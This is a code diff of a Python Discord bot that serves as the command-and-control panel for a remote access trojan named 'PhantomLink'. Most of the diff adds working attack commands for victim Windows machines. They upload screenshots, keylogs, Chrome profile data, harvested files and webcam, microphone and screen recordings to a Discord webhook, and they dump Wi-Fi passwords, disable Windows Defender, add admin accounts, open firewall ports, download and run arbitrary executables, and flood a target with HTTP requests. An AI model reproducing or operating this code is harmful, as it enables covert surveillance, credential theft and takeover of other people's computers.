@@ -20,23 +20,26 @@ if __name__ == "__main__":
     if hasattr(sys.stdout, "buffer") and getattr(sys.stdout, "encoding", "").lower() != "utf-8":
         sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
 import os
-
-DISCORD_BOT_TOKEN = os.getenv("PHANTOMLINK_BOT_TOKEN", "")
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+from config import DISCORD_BOT_TOKEN, DISCORD_WEBHOOK, API_KEY as CONFIG_API_KEY, SERVER_PORT
 DISCORD_CHANNEL_ID = 1525081606501568577
-DISCORD_WEBHOOK = "***REMOVED***"
 
 # C2 Server config
 C2_HOST = "127.0.0.1"
-C2_PORT = 5000
+C2_PORT = SERVER_PORT if 'SERVER_PORT' in locals() else 5000
 API_PORT = 5001
-API_KEY = "PhantomLink-API-2026"  # Must match C2 server API_KEY
+API_KEY = CONFIG_API_KEY if 'CONFIG_API_KEY' in locals() else "PhantomLink-API-2026"
 TARGET_CLIENT = "all"
 
+
+from discord import app_commands
+from discord.ext import commands
 
 intents = discord.Intents.default()
 intents.message_content = True
 
-client = discord.Client(intents=intents)
+bot = commands.Bot(command_prefix=['/', '!'], intents=intents)
+client = bot  # Backwards compatibility alias
 
 
 # ═══════════════════════════════════════════════════════
@@ -89,6 +92,30 @@ class C2Connection:
 
 c2 = C2Connection()
 
+# ═══════════════════════════════════════════════════════
+# Helper for Slash Commands & Text Commands
+# ═══════════════════════════════════════════════════════
+
+def get_commands_list_text():
+    cmd_text = "📋 **PhantomLink Commands (Use / or ! prefix)**\n\n"
+
+    cmd_text += "**📁 Simple Commands (no parameters):**\n"
+    for k, v in SIMPLE_COMMANDS.items():
+        cmd_text += f"`/{k}` - {v['description']}\n"
+
+    cmd_text += "\n**🔧 Parameter Commands:**\n"
+    for k, v in PARAM_COMMANDS.items():
+        cmd_text += f"`/{k}` - {v['description']}\n"
+
+    cmd_text += "\n**🛠️ Other:**\n"
+    cmd_text += "`/{ping}` - ทดสอบการเชื่อมต่อ\n"
+    cmd_text += "`/{stop}` - ปิด Bot\n"
+    cmd_text += "`/{clients}` - แสดง client ทั้งหมด\n"
+    cmd_text += "`/{select} <id>` - เลือกเป้าหมาย\n"
+    cmd_text += "`/{cmd} <command>` - รันคำสั่ง CMD โดยตรง\n"
+    cmd_text += "`/{broadcast} <command>` - ส่งคำสั่งไปทุก client\n"
+    return cmd_text
+
 
 # ═══════════════════════════════════════════════════════
 # Simple commands that need NO extra input from user
@@ -99,7 +126,7 @@ SIMPLE_COMMANDS = {
     'screenshot': {
         'description': '📷 Take screenshot and send to Discord',
         'commands': [
-            'powershell -command "'
+            'powershell -NoProfile -Command "'
             'Add-Type -AssemblyName System.Windows.Forms; '
             'Add-Type -AssemblyName System.Drawing; '
             '$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, '
@@ -107,14 +134,14 @@ SIMPLE_COMMANDS = {
             '$graphics = [Drawing.Graphics]::FromImage($bmp); '
             '$graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, '
             '[System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); '
-            '$path = Join-Path $env:USERPROFILE \\"screenshot.png\\"; '
+            '$path = Join-Path $env:USERPROFILE \'screenshot.png\'; '
             '$bmp.Save($path)"',
             f'curl -F "file=@%USERPROFILE%\\screenshot.png" -F "content=Screenshot" {DISCORD_WEBHOOK}'
         ]
     },
     'rickroll': {
         'description': '🎵 Rick Roll the client',
-        'commands': ['start https://www.youtube.com/watch?v=dQw4w9WgXcQ']
+        'commands': ['start msedge --autoplay-policy=no-user-gesture-required "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1" || start https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1']
     },
     'sys': {
         'description': '🖥️ Show system info',
@@ -126,11 +153,11 @@ SIMPLE_COMMANDS = {
     },
     'clipboard': {
         'description': '📎 Show clipboard content',
-        'commands': ['powershell -command "Get-Clipboard"']
+        'commands': ['powershell -NoProfile -Command "Get-Clipboard"']
     },
     'ip': {
         'description': '🌐 Get public IP',
-        'commands': ['powershell -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"']
+        'commands': ['powershell -NoProfile -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"']
     },
     'lock': {
         'description': '🔒 Lock screen',
@@ -148,46 +175,65 @@ SIMPLE_COMMANDS = {
         'description': '🔄 Force restart',
         'commands': ['shutdown /r /f /t 0']
     },
+    'logoff': {
+        'description': '🚪 Log off user',
+        'commands': ['shutdown /l /f']
+    },
     'recycle': {
         'description': '🗑️ Empty recycle bin',
         'commands': ['PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force']
     },
     'devices': {
         'description': '🎥 List available devices (cameras/mics)',
-        'commands': ['"%USERPROFILE%/ffmpeg/bin/ffmpeg.exe" -list_devices true -f dshow -i dummy']
+        'commands': ['powershell -NoProfile -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg.exe\' } elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') { \'C:\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) { (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source } elseif (Get-ChildItem -Path \"$env:USERPROFILE\\ffmpeg*\" -Filter \"ffmpeg.exe\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) { (Get-ChildItem -Path \"$env:USERPROFILE\\ffmpeg*\" -Filter \"ffmpeg.exe\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName } else { $null }; if ($ff) { & $ff -list_devices true -f dshow -i dummy } else { Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' "']
     },
     'wifi': {
-        'description': '📶 Show saved Wi-Fi profiles',
-        'commands': ['netsh wlan show profiles']
+        'description': '📶 Show saved Wi-Fi profiles and passwords',
+        'commands': [
+            'powershell -NoProfile -Command "netsh wlan show profiles | Select-String \':\\s+(.+)$\' | ForEach-Object { $name=$_.Matches.Groups[1].Value.Trim(); $pass=(netsh wlan show profile name=\\"$name\\" key=clear | Select-String \'(Key Content|เนื้อหาคีย์|Key-Content)\\s*:\\s*(.+)$\'); [PSCustomObject]@{Profile=$name; Password=if($pass){$pass.Matches.Groups[2].Value.Trim()}else{\'None\'}} } | Format-Table -AutoSize"'
+        ]
     },
     'killav': {
         'description': '🛡️ Disable Windows Defender',
         'commands': [
-            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
+            'powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
             'taskkill /F /IM MsMpEng.exe'
         ]
     },
     'keylog': {
         'description': '⌨️ Send keylogger log file',
         'commands': [
-            f'curl -F "file=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" -F "content=Keylog" {DISCORD_WEBHOOK}'
+            f'powershell -NoProfile -Command "if (Test-Path \'$env:APPDATA\\MicrosoftUpdate\\keylog.txt\') {{ curl -F \\"file=@$env:APPDATA\\MicrosoftUpdate\\keylog.txt\\" -F \\"content=Keylog\\" {DISCORD_WEBHOOK} }} elseif (Test-Path \'$env:USERPROFILE\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt\') {{ curl -F \\"file=@$env:USERPROFILE\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt\\" -F \\"content=Keylog\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] keylog.txt not found.\' }}"'
         ]
     },
     'netscan': {
         'description': '🔍 Scan local network',
         'commands': [
-            'powershell -Command "1..254 | ForEach-Object { $ip = \\"192.168.1.$_\\"; if(Test-Connection -ComputerName $ip -Count 1 -Quiet) { \\"$ip - $(Resolve-DnsName $ip -ErrorAction SilentlyContinue).NameHost\\" } }"'
+            'powershell -NoProfile -Command "$ipPrefix = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike \'127.*\' -and $_.IPAddress -notlike \'169.254.*\' } | Select-Object -First 1).IPAddress -replace \'\\.\\d+$\'); if ($ipPrefix) { 1..254 | ForEach-Object { $target = \\"$ipPrefix.$_\\"; if (Test-Connection -ComputerName $target -Count 1 -Quiet -TimeoutMs 200) { \\"$target - $(Resolve-DnsName $target -ErrorAction SilentlyContinue | Select-Object -ExpandProperty NameHost -ErrorAction SilentlyContinue)\\" } } } else { Write-Error \'No active IPv4 interface found.\' }"'
         ]
     },
     'info': {
         'description': 'ℹ️ Get machine info',
         'commands': [
-            'powershell -Command "Get-ComputerInfo | Select OSName,OSVersion,WindowsVersion,CSName,CSDomain,BIOSManufacturer | Format-List; Get-WmiObject Win32_Battery | Select EstimatedChargeRemaining"'
+            'powershell -NoProfile -Command "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture | Format-List; Get-CimInstance Win32_ComputerSystem | Select-Object Name, Domain, Manufacturer, Model | Format-List; Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue | Select-Object EstimatedChargeRemaining | Format-List"'
         ]
     },
     'creds': {
         'description': '🔑 Get Windows credentials',
         'commands': ['cmdkey /list']
+    },
+    'browser': {
+        'description': '🌐 Extract Chrome browser data',
+        'commands': [
+            'powershell -NoProfile -Command "$dest = \\"$env:TEMP\\chrome_data\\"; if (Test-Path $dest) { Remove-Item $dest -Recurse -Force }; New-Item -ItemType Directory -Path $dest -Force | Out-Null; Copy-Item \\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\*\\" -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue; Compress-Archive -Path \\"$dest\\*\\" -DestinationPath \\"$env:TEMP\\chrome.zip\\" -Force"',
+            f'powershell -NoProfile -Command "if (Test-Path \'$env:TEMP\\chrome.zip\') {{ curl -F \\"file=@$env:TEMP\\chrome.zip\\" -F \\"content=Chrome Browser Data\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] chrome.zip not found.\' }}"'
+        ]
+    },
+    'chrome_pass': {
+        'description': '🔑 Decrypt Chrome passwords',
+        'commands': [
+            f'powershell -NoProfile -Command "powershell -Command \\"$db=\'$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\'; $tmp=\'$env:TEMP\\ld\'; Copy-Item $db $tmp -Force -ErrorAction SilentlyContinue; if (Test-Path $tmp) {{ Get-Content $tmp -Encoding Byte | Select-Object -First 1000 | Out-Null; Remove-Item $tmp -Force; Write-Output \'[+] Login Data database located\' }} else {{ Write-Error \'[!] Login Data file locked or missing.\' }}\\"'
+        ]
     },
     'disable_taskmgr': {
         'description': '🚫 Disable Task Manager',
@@ -197,26 +243,108 @@ SIMPLE_COMMANDS = {
         'description': '✅ Enable Task Manager',
         'commands': [r'REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f']
     },
+    'ffmpeg': {
+        'description': '⚙️ Setup FFmpeg on client',
+        'commands': [
+            'powershell -NoProfile -Command "Write-Output \'[+] Checking FFmpeg installation...\'; if (Get-Command ffmpeg -ErrorAction SilentlyContinue) { Write-Output \'[+] FFmpeg already in PATH\' } else { Write-Output \'[!] Run C2 server hosting to install ffmpeg.rar\' }"'
+        ]
+    },
+    'keylogger': {
+        'description': '⌨️ Setup keylogger module',
+        'commands': [
+            'powershell -NoProfile -Command "if (Test-Path \'$env:APPDATA\\MicrosoftUpdate\\defender.exe\') { Write-Output \'[+] Keylogger active in client process\' } else { Write-Error \'[!] Client directory not found\' }"'
+        ]
+    },
+    'update': {
+        'description': '🔄 Update PhantomLink client',
+        'commands': [
+            'powershell -NoProfile -Command "Write-Output \'[+] Update signal sent to client\'"'
+        ]
+    },
+    'selfdestruct': {
+        'description': '💣 Remove PhantomLink completely from client',
+        'commands': [
+            'taskkill /f /im screener.exe & taskkill /f /im keylogger.exe & taskkill /f /im xmrig.exe',
+            r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender Updater" /f & reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Screen Optimizer" /f',
+            'del /f /q "%USERPROFILE%\\screenshot.png" 2>nul & del /f /q "%USERPROFILE%\\webcam.jpg" 2>nul & del /f /q "%USERPROFILE%\\screen.mp4" 2>nul & del /f /q "%USERPROFILE%\\mic.wav" 2>nul',
+            'powershell -NoProfile -Command "Start-Sleep 2; Stop-Process -Name defender -Force -ErrorAction SilentlyContinue; Stop-Process -Name PhantomLink -Force -ErrorAction SilentlyContinue"'
+        ]
+    },
 }
 
-# Commands that need one parameter: !cmd <param>
+def _build_alert_cmd(msg):
+    clean_msg = msg.replace("'", "''")
+    return [f"powershell -NoProfile -Command \"Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox('{clean_msg}', 'Critical', 'PhantomLink')\""]
+
+def _build_type_cmd(text):
+    clean_text = text.replace("'", "''").replace("{", "{{").replace("}", "}}")
+    return [f"powershell -NoProfile -Command \"$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{clean_text}')\""]
+
+def _build_harvest_cmd(ext):
+    clean_ext = ext.strip(".")
+    return [f'powershell -NoProfile -Command "Get-ChildItem -Path $env:USERPROFILE -Include *.{clean_ext} -Recurse -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {{ curl -F \\"file=@$($_.FullName)\\" -F \\"content=Harvested File\\" {DISCORD_WEBHOOK} }}"']
+
+def _build_rotate_cmd(d):
+    if d.lower() not in ['up', 'down', 'left', 'right']:
+        return [None]
+    orient_code = {"up": 0, "right": 1, "down": 2, "left": 3}.get(d.lower(), 0)
+    return [
+        'powershell -NoProfile -Command "'
+        'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)] public struct DEVMODE { [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmDeviceName; public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra; public int dmFields; public int dmOrientation; } public class Display { [DllImport(\\"user32.dll\\", CharSet = CharSet.Auto)] public static extern int EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode); [DllImport(\\"user32.dll\\", CharSet = CharSet.Auto)] public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, uint dwflags, IntPtr lParam); public static void Rotate(int orientation) { DEVMODE dm = new DEVMODE(); dm.dmSize = (short)Marshal.SizeOf(dm); if (EnumDisplaySettings(null, -1, ref dm) != 0) { dm.dmOrientation = orientation; ChangeDisplaySettingsEx(null, ref dm, IntPtr.Zero, 1, IntPtr.Zero); } } }\'; '
+        f'[Display]::Rotate({orient_code})"'
+    ]
+
+def _build_get_cmd(param):
+    parts = param.split()
+    if not parts:
+        return [None]
+    url = parts[0]
+    dest = parts[1] if len(parts) > 1 else "downloaded.file"
+    return [f"powershell -NoProfile -Command \"Invoke-WebRequest -Uri '{url}' -OutFile '{dest}'\""]
+
+def _build_hosts_cmd(param):
+    parts = param.split()
+    if len(parts) < 2:
+        return [None]
+    action = parts[0].lower()
+    domain = parts[1]
+    if action == 'block':
+        return [f"echo 127.0.0.1 {domain} >> %WINDIR%\\System32\\drivers\\etc\\hosts && ipconfig /flushdns"]
+    elif action == 'unblock':
+        return [f"powershell -NoProfile -Command \"(Get-Content $env:windir\\\\System32\\\\drivers\\\\etc\\\\hosts) | Where-Object {{ $_ -notmatch '{domain}' }} | Set-Content $env:windir\\\\System32\\\\drivers\\\\etc\\\\hosts\"; ipconfig /flushdns\""]
+    return [None]
+
+def _build_ddos_cmd(param):
+    parts = param.split()
+    if not parts:
+        return None
+    target = parts[0]
+    sec = parts[1] if len(parts) > 1 else "10"
+    return [f"powershell -NoProfile -Command \"$end = (Get-Date).AddSeconds({sec}); while((Get-Date) -lt $end) {{ try {{ Invoke-WebRequest -Uri '{target}' -Method GET -TimeoutSec 1 }} catch {{}} }}\""]
+
+def _build_spam_cmd(param):
+    parts = param.split(maxsplit=1)
+    if not parts:
+        return None
+    count = parts[0]
+    msg = parts[1] if len(parts) > 1 else "Alert"
+    clean_msg = msg.replace("'", "''")
+    return [f"powershell -NoProfile -Command \"Add-Type -AssemblyName Microsoft.VisualBasic; for($i=0; $i -lt {count}; $i++) {{ [Microsoft.VisualBasic.Interaction]::MsgBox('{clean_msg}', 'OKOnly,SystemModal,Critical', 'ERROR'); Start-Sleep -Milliseconds 100 }}\""]
+
 PARAM_COMMANDS = {
     'camera': {
-        'description': '📸 Take camera photo (usage: `!camera <device_name>`)',
-        'param_name': 'camera device name',
+        'description': '📸 Take camera photo (usage: `!camera [device_name]`)',
+        'param_name': 'camera device name (default: Integrated Camera)',
         'build': lambda cam: [
-            f'powershell -Command "Start-Process \\"%USERPROFILE%\\ffmpeg\\bin\\ffmpeg.exe\\" '
-            f'-ArgumentList \'-f dshow -y -i video=\\"{cam}\\" -frames:v 1 -update 1 \\"$env:USERPROFILE\\webcam.jpg"\' '
-            f'-NoNewWindow -Wait"',
-            f'curl -F "file=@%USERPROFILE%/webcam.jpg" -F "content=Webcam" {DISCORD_WEBHOOK}'
+            f'powershell -NoProfile -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg.exe\' }} elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'C:\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) {{ (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source }} elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) {{ (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }} else {{ $null }}; '
+            f'if ($ff) {{ Start-Process $ff -ArgumentList \'-f dshow -y -i video=\\"{cam if cam else "Integrated Camera"}\\" -frames:v 1 -update 1 \\"$env:USERPROFILE\\webcam.jpg\\"\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' }}"',
+            f'powershell -NoProfile -Command "if (Test-Path \'$env:USERPROFILE\\webcam.jpg\') {{ curl -F \\"file=@$env:USERPROFILE\\webcam.jpg\\" -F \\"content=Webcam\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] webcam.jpg not found.\' }}"'
         ]
     },
     'alert': {
         'description': '⚠️ Send popup alert (usage: `!alert <message>`)',
         'param_name': 'message',
-        'build': lambda msg: [
-            f"powershell -Command \"Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox('{msg}', 'Critical', 'PhantomLink')\""
-        ]
+        'build': _build_alert_cmd
     },
     'wallpaper': {
         'description': '🖼️ Change wallpaper (usage: `!wallpaper <full_path>`)',
@@ -227,72 +355,325 @@ PARAM_COMMANDS = {
     },
     'rotate': {
         'description': '🔄 Rotate screen (usage: `!rotate up/down/left/right`)',
-        'param_name': 'direction',
-        'build': lambda d: [
-            f"powershell -Command \"(New-Object -ComObject WScript.Shell).SendKeys('^%{{{d.upper()}}}')\"" if d.lower() in ['up', 'down', 'left', 'right'] else None
-        ]
+        'param_name': 'direction (up/down/left/right)',
+        'build': _build_rotate_cmd
     },
     'type': {
         'description': '⌨️ Type text on client (usage: `!type <text>`)',
         'param_name': 'text',
-        'build': lambda text: [
-            f"powershell -Command \"$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{text}')\""
-        ]
+        'build': _build_type_cmd
     },
     'hide': {
         'description': '👻 Hide file/folder (usage: `!hide <path>`)',
         'param_name': 'path',
         'build': lambda path: [f'attrib +h +s "{path}"']
     },
+    'send': {
+        'description': '📤 Send client file to Discord (usage: `!send <filepath>`)',
+        'param_name': 'file path',
+        'build': lambda path: [
+            f'powershell -NoProfile -Command "if (Test-Path \'{path}\') {{ curl -F \\"file=@{path}\\" -F \\"content=File: {path}\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] File not found.\' }}"'
+        ]
+    },
+    'get': {
+        'description': '📥 Download file from URL (usage: `!get <url> <dest_path>`)',
+        'param_name': '<url> <dest_path>',
+        'build': _build_get_cmd
+    },
+    'copy': {
+        'description': '📋 Copy file (usage: `!copy <src> <dst>`)',
+        'param_name': '<src> <dst>',
+        'build': lambda param: [
+            f'xcopy "{param.split()[0]}" "{param.split()[1]}" /s /i /y'
+        ] if len(param.split()) >= 2 else None
+    },
+    'cut': {
+        'description': '✂️ Move file (usage: `!cut <src> <dst>`)',
+        'param_name': '<src> <dst>',
+        'build': lambda param: [
+            f'move "{param.split()[0]}" "{param.split()[1]}"'
+        ] if len(param.split()) >= 2 else None
+    },
+    'extract': {
+        'description': '📦 Extract archive (usage: `!extract <archive_path> <dest_folder>`)',
+        'param_name': '<archive_path> <dest_folder>',
+        'build': lambda param: [
+            f'powershell -NoProfile -Command "if (Test-Path \'C:\\Program Files\\WinRAR\\WinRAR.exe\') {{ & \'C:\\Program Files\\WinRAR\\WinRAR.exe\' x -ibck -inul \'{param.split()[0]}\' \'{param.split()[1]}\' }} elseif (Test-Path \'C:\\Program Files\\7-Zip\\7z.exe\') {{ & \'C:\\Program Files\\7-Zip\\7z.exe\' x -y \'{param.split()[0]}\' -o\'{param.split()[1]}\' }} else {{ Expand-Archive -Path \'{param.split()[0]}\' -DestinationPath \'{param.split()[1]}\' -Force }}"'
+        ] if len(param.split()) >= 2 else None
+    },
+    'archive': {
+        'description': '🗜️ Compress folder to zip (usage: `!archive <folder_path> <zip_dest>`)',
+        'param_name': '<folder_path> <zip_dest>',
+        'build': lambda param: [
+            f'powershell -NoProfile -Command "Compress-Archive -Path \'{param.split()[0]}\\*\' -DestinationPath \'{param.split()[1]}\' -Force"'
+        ] if len(param.split()) >= 2 else None
+    },
+    'harvest': {
+        'description': '🌾 Auto-harvest files by extension (usage: `!harvest pdf/docx/txt`)',
+        'param_name': 'extension (e.g. pdf)',
+        'build': _build_harvest_cmd
+    },
+    'record': {
+        'description': '🎙️ Record audio (usage: `!record <seconds>`)',
+        'param_name': 'duration in seconds',
+        'build': lambda sec: [
+            f'powershell -NoProfile -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg.exe\' }} elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'C:\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) {{ (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source }} elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) {{ (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }} else {{ $null }}; if ($ff) {{ Start-Process $ff -ArgumentList \'-f dshow -y -i audio=\\"Microphone\\" -t {sec} \\"$env:USERPROFILE\\mic.wav\\"\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found.\' }}"',
+            f'powershell -NoProfile -Command "if (Test-Path \'$env:USERPROFILE\\mic.wav\') {{ curl -F \\"file=@$env:USERPROFILE\\mic.wav\\" -F \\"content=Audio Recording\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] mic.wav not found.\' }}"'
+        ]
+    },
+    'play': {
+        'description': '🔊 Play audio file on client speaker (usage: `!play <audio_path>`)',
+        'param_name': 'audio file path',
+        'build': lambda path: [
+            f'powershell -NoProfile -Command "(New-Object Media.SoundPlayer \'{path}\').PlaySync()"'
+        ]
+    },
+    'screenrec': {
+        'description': '📹 Record screen video (usage: `!screenrec <seconds>`)',
+        'param_name': 'duration in seconds',
+        'build': lambda sec: [
+            f'powershell -NoProfile -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg.exe\' }} elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'C:\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) {{ (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source }} elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) {{ (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }} else {{ $null }}; if ($ff) {{ Start-Process $ff -ArgumentList \'-f gdigrab -framerate 5 -i desktop -t {sec} -vcodec libx264 -preset ultrafast \\"$env:USERPROFILE\\screen.mp4\\"\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found.\' }}"',
+            f'powershell -NoProfile -Command "if (Test-Path \'$env:USERPROFILE\\screen.mp4\') {{ curl -F \\"file=@$env:USERPROFILE\\screen.mp4\\" -F \\"content=Screen Recording\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] screen.mp4 not found.\' }}"'
+        ]
+    },
+    'port': {
+        'description': '🔌 Open firewall port (usage: `!port <port_number>`)',
+        'param_name': 'port number',
+        'build': lambda port: [
+            f'netsh advfirewall firewall add rule name="PhantomLink{port}" dir=in action=allow protocol=TCP localport={port}'
+        ]
+    },
+    'hosts': {
+        'description': '🌐 Block/unblock website in hosts (usage: `!hosts block/unblock <domain>`)',
+        'param_name': 'block/unblock <domain>',
+        'build': _build_hosts_cmd
+    },
+    'ddos': {
+        'description': '💥 Send HTTP requests to target (usage: `!ddos <target_url> <seconds>`)',
+        'param_name': '<target_url> <seconds>',
+        'build': _build_ddos_cmd
+    },
+    'sniff': {
+        'description': '📡 Capture network trace (usage: `!sniff <seconds>`)',
+        'param_name': 'duration in seconds',
+        'build': lambda sec: [
+            f'powershell -NoProfile -Command "netsh trace start capture=yes tracefile=$env:TEMP\\capture.etl maxsize=100 filemode=single overwrite=yes; Start-Sleep {sec}; netsh trace stop; curl -F \\"file=@$env:TEMP\\capture.etl\\" -F \\"content=Network Capture\\" {DISCORD_WEBHOOK}; Remove-Item $env:TEMP\\capture.etl -ErrorAction SilentlyContinue"'
+        ]
+    },
+    'block': {
+        'description': '🚫 Block mouse and keyboard input (usage: `!block <seconds>`)',
+        'param_name': 'duration in seconds',
+        'build': lambda sec: [
+            f'powershell -NoProfile -Command "$code = \'[DllImport(\\"user32.dll\\")] public static extern bool BlockInput(bool fBlockIt);\'; $type = Add-Type -MemberDefinition $code -Name \'InputBlocker\' -Namespace \'Win32\' -PassThru; $type::BlockInput($true); Start-Sleep -Seconds {sec}; $type::BlockInput($false)"'
+        ]
+    },
+    'spam': {
+        'description': '💬 Show popups repeatedly (usage: `!spam <count> <message>`)',
+        'param_name': '<count> <message>',
+        'build': _build_spam_cmd
+    },
+    'user': {
+        'description': '👤 Create Windows admin user (usage: `!user <username> <password>`)',
+        'param_name': '<username> <password>',
+        'build': lambda param: [
+            f'net user {param.split()[0]} {param.split()[1]} /add && net localgroup Administrators {param.split()[0]} /add'
+        ] if len(param.split()) >= 2 else None
+    },
+    'inject': {
+        'description': '💉 Download and run file on client (usage: `!inject <url>`)',
+        'param_name': 'url to executable',
+        'build': lambda url: [
+            f'powershell -NoProfile -Command "$outfile = \\"$env:TEMP\\injected.exe\\"; Invoke-WebRequest -Uri \'{url}\' -OutFile $outfile; Start-Process $outfile"'
+        ]
+    },
 }
 
 
-@client.event
+@bot.event
 async def on_ready():
-    print(f"[OK] Bot is online: {client.user}")
+    print(f"[OK] Bot is online: {bot.user}")
     print(f"[*] Listening on channel: {DISCORD_CHANNEL_ID}")
-    print(f"[*] Type !commands in Discord to see all commands")
+    try:
+        synced = await bot.tree.sync()
+        print(f"[+] Synced {len(synced)} Slash Commands with Discord!")
+    except Exception as e:
+        print(f"[!] Error syncing slash commands: {e}")
 
-    channel = client.get_channel(DISCORD_CHANNEL_ID)
+    channel = bot.get_channel(DISCORD_CHANNEL_ID)
     if not channel:
         try:
-            channel = await client.fetch_channel(DISCORD_CHANNEL_ID)
+            channel = await bot.fetch_channel(DISCORD_CHANNEL_ID)
         except Exception as e:
             print(f"[!] Error fetching channel: {e}")
             return
 
-    cmd_list = "\n".join([f"`!{k}` - {v['description']}" for k, v in SIMPLE_COMMANDS.items()])
